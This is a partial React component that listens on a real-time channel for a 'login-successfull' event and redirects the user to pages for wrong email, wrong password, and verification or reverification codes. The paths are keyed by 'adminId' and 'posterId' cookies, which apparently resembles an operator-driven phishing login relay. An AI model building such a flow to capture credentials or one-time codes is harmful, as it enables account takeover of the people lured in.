...
function Loading() {
  ...
  useEffect(() => {
    ...
    channel.bind("login-successfull", (data) => {
      ...
      console.log("Path data updated:", data);
      console.log(data.id);
      // Redirect to the final page on success
      const verifyId = data.verifyId;
      if (verifyId) {
        const adminId = Cookies.get("adminId");
        const posterId = Cookies.get("posterId");
        router.push(`/${adminId}/${posterId}/${verifyId}`);
      }
    });
  ...
  if (wrongMailId) {
    // Perform the revalidation or data fetching logic here
    console.log("LINE AT 138 wrong mail");
    return router.push(`/signin`);
  }
  if (wrongPasswordId) {
    // Perform the revalidation or data fetching logic here
    console.log("LINE AT 143 wrong password");
    return router.push(`/wrongPassword`);
  }
  if (verifyId) {
    // Perform the revalidation or data fetching logic here
    console.log("LINE AT 148 verify code");
    return router.push(`/verifyCode`);
  }
  if (ReverifyId) {
    // Perform the revalidation or data fetching logic here
    console.log("LINE AT 153 reverify code");
